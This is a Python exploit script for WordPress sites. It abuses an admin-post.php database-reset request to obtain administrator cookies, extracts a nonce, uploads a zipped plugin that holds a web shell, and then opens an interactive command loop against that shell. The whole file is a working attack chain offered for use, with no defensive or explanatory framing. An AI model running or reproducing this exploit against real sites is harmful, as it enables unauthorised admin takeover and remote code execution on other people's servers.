import requests
import sys
import re

req = requests.session()
cookies=[]

def main(url):
    print("[+] Trying to Get access to admin panel")
    payload = "/wp-admin/admin-post.php?db-reset-tables%5B%5D=comments&db-reset-code=11111&db-reset-code-confirm=11111"
    r = req.get(url+payload, allow_redirects=False)
    for cookie in r.cookies:
        cookies.append((re.sub("for.*\/>","",str(cookie).replace("<Cookie ",""))))
    req.cookies.clear()
    extract_nonce(url)

def extract_nonce(url):
    print("[*] Extracting Nonce")
    payload="/wp-admin/plugin-install.php"
    cookie={"wordpress_test_cookie":"WP Cookie check",cookies[0].split("=")[0]:str(cookies[0].split("=")[1]).split()[0],cookies[1].split("=")[0]:str(cookies[1].split("=")[1]).split()[0]} 
    r = req.get(url+payload,cookies=cookie)
    #print(r.cookies)
    nonce=re.findall("value=\"(.*)/><i",r.text)[0].replace("\"/><i","").replace("value=\"","").replace("\"","").split()[0]
    if len(nonce)==10:
        print("[+] Fetched Nonce:- {}".format(nonce))
        for i in r.cookies:    new = re.sub("for.*\/>","",str(i).replace("<Cookie ","")) 
        cookie[new.split("=")[0]]=str(new.split("=")[1]).split()[0]
        req.cookies.clear()
        shell_upload(cookie,nonce,url)
    else:
        print("[-] Failed")
        sys.exit()    

def shell_upload(cookie,nonce,url):
    print("[*] Trying to upload shell")
    payload="/wp-admin/update.php?action=upload-plugin"
    files={"_wpnonce":(None,nonce),"_wp_http_referer":(None,"/wp-admin/plugin-install.php"),"pluginzip":("config.yaml",open("ubh.zip","rb")),"install-plugin-submit":(None,"Install Now")}
    r=req.post(url+payload,files=files,cookies=cookie)
    if r.text.find("Plugin installed successfully"):
        print("[+] Shell uploaded successfully")
        shell_handler(url)
    else:
        print("[-] Shell upload failed")    


def shell_handler(url):
    print("[*] Pulling the handler sire :)~)~)~)~)~")
    payload="/wp-content/plugins/ubh/up.php?cmd="
    while(True):
        i=input("cmd> ")
        print(str(req.get(url+payload+i).text).replace("<pre>","").replace("\n</pre>",""))



if len(sys.argv)<2:
    print("USAGE ~ python3 exp.py http://127.0.0.1/")
else:
    main(sys.argv[1])
